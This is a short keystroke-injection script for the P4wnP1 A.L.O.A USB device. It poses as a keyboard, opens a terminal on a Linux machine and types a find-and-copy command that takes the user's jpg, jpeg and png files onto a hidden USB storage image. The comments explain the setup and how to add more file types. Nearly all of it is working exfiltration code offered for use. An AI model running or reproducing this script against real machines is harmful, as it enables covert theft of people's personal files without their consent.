//This script opens a terminal and exfils .png, .jpg, .txt files to a mounted USB 
// Copies files from linux machine onto P4wnP1 A.L.O.A
// You need to setup P4wnP1 USB Gadget Settings as HID keyboard and Mass storage
// Create storage using genimg: "/usr/local/P4wnP1/helper/genimg -i -s 10000 -o exfil -l exfil"
//the 10000 is MB ~10GB
//THE PROCESS WILL TAKE A WHILE FOR LARGE SIZED BINS
//mine took about 3 to 5 hours for a ~128GB exfil bin
//I'm using a 512GB card
layout('us')
press("ALT F2")
delay (1000)
type ("gnome-terminal")
delay(600)
press("ENTER")
delay(800)
type ('USER_NAME=$(whoami); MOUNT_POINT="/media/$USER_NAME/exfil"; if [ ! -d "$MOUNT_POINT" ]; then MOUNT_POINT="/run/media/$USER_NAME/exfil"; fi; mkdir $MOUNT_POINT/"$USER_NAME"; DESTINATION=$MOUNT_POINT/"$USER_NAME"; find -type f -iname "*jpg" -exec cp -t "$DESTINATION" {} +; find -type f -iname "*.jpeg" -exec cp -t "$DESTINATION" {} +; find -type f -iname "*.png" -exec cp -t "$DESTINATION" {} +')
delay(500)
press("ENTER")
delay(500)
//change the file types or add to the script with ; find -type f -iname "*.newfile" exec cp -t $DESTINATION {} +  for each new file type

